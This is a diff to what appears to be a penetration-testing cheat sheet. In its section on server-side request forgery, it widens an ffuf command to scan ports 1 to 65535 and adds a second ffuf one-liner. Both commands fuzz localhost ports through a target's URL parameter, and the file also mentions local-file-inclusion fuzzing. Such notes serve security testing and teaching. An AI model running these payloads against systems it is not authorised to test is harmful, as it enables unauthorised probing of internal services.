@@ -562,7 +562,11 @@ $ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<R
 ### Server-Side Request Forgery (SSRF)
 
 ```c
-$ seq 1 10000 | ffuf -w - -u http://<RHOST> -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylUeVtv36vebZPACI" -d '------WebKitFormBoundarylUeVtv36vebZPACI            
+$ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'url=http%3A%2F%2Flocalhost%3AFUZZ'
+```
+
+```c
+$ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylUeVtv36vebZPACI" -d '------WebKitFormBoundarylUeVtv36vebZPACI            
 Content-Disposition: form-data; name="foobar"
 
 http://127.0.0.1:FUZZ
